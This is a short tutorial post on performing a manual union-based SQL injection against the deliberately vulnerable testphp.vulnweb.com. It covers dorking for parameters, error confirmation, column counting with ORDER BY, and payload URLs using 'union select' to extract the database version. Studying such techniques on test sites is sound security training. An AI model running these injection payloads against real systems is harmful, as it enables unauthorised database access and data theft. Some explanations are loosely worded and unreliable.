<h2>EXPLOITING UNION BASED SQL INJECTION MANUALLY</h2>

HERE I SHOWCASE HOW TO PERFORM A BASIC UNION BASED SQL INJECTION (MANUALLY)

KINDLY CHECK NEXT POST FOR ADVANCED UNION BASED SQLI WHERE I SHOWED HOW TO BYPASS SOME WAFS AND FILTERS

``Performing a Union-Based SQL Injection attack manually involves injecting a crafted payload into an input field or parameter to manipulate a SQL query and retrieve unauthorized data from the database. Please note that attempting SQL injection on systems you don't own or have explicit permission to test is illegal and unethical. Only perform these actions in a controlled, legal environment with proper authorization.``

Target: https://testphp.vulnweb.com/ (intentionally vulnerable site created for testing purpose)

**STEP 1:**

``Finding the injection point: we can simply find the injection point of a site by dorking for parameters with value``

dork example: ``site:testphp.vulnweb.com inurl:php?``. There are many dorks online you can search for more.

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/71e2cbe6-2ad8-4704-b9f3-58d3157b6528)

clicking on any of those pages in the result should reveal the directory with parameter.

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/58b964c7-9ede-40cd-8e2a-d4d19d435995)

As you can see we have a parameter and a value which we can then confirm the vulnerabilty

**STEP 2**

``Confirming the vulnerability: we can easily confirm the vulnerability by throwing a single quote or double quotes at the end of the parameter``
![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/1c2ec9d8-c6ee-4f2f-b026-fbcf65108af6)
As you can see it throws an SQL error which confirms the vulnnerability

**STEP 3**

``Adding a URL balancer(comment) to fix the error: well actually it only depends on the environment and reaction of application when we try some commenting operators. If you see php is used then usually "--" will surely work other wise you can check "--+" or "# (url encoded)", else the best option is to try with different types of comments and analyse the input. So what we will do to check is try to close our input with all possibilities like single quote double quote or brackets etc, and comment rest query and if it works then we can be sure that this comment is working.``

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/3541e6aa-8396-4dd6-aa65-7e5c2ad6f094)

No error after addiing the balancer. We can now proceed to the next step

**STEP 4**

``Finding the total number of columns present in the database``

we can easily use the ``order by`` or ``group by`` statement


![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/7f4aa84f-1f38-4a27-93d0-bab8aa9edb5f)

``order by 1`` didn't give error so we will keep increasing the number till we get error

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/29c929b1-85e3-4ca2-a288-994ec005e33f)

``order by 1000`` showed errors which means we dont have up to 1000 columns in the database

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/450dfa62-b496-41ca-826f-16caef47db97)

increasing the number i got error at ``order by 4`` which shows we have 3 columns present in the database


**STEP 5**

``Finding the vulnerable column: we will be injecting our SQL payloads in the vulnerable column``
 
 we can get the vulnerable column by adding a dot or a slash before the parametre value combined with the ``union select statement``
 
 ```http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3```

***Note the - after the = sign***

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/25527c10-1785-4f3b-b1d6-814f4f97dd47)
Those numbers showing on the screen are the vulnerable columns so, you can choose the one you prefer for the injection

i will be choosing column 2 here.

**STEP 6**

``getting the database name and version: you can get the database version by inputing the @@version or version() and for db name database() in the vulnerable column``

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/e600515b-3169-4dcc-9ee9-aafc8d6b7fe5)

![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/949e1917-e5e6-4667-aa93-d6b6ae8d4525)

```http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,version(),3```














